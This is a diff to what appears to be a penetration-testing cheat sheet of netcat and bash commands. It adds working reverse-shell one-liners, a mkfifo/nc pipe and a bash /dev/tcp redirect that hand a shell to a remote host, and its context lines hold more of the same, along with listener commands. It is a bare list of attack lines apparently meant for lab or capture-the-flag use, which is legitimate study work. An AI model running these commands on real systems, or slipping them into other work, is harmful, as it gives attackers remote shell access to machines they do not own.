@@ -229,6 +229,8 @@ netstat -antp --> running services and ports
 nc -nv 192.168.145.129 4444 -e /bin/bash 2> /tmp/error_log 
 nc -nlvp 4444 
 
+rm /tmp/fa;mkfifo /tmp/fa;cat /tmp/fa|/bin/sh -i 2>&1|nc 10.10.14.86 4444 >/tmp/fa
+
 ncat is similar to nc but also supports ssl for encryption
 
 ncat -nlvp 4444 --ssl --allow <ip>
@@ -245,6 +247,8 @@ sbd -k secret 127.0.0.1 4444
 * Bash Shell
 
 ```
+/bin/bash -i &>/dev/tcp/10.10.10.14/4757 0>&1
+
 /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.74/4757 0>&1"
 ```
 
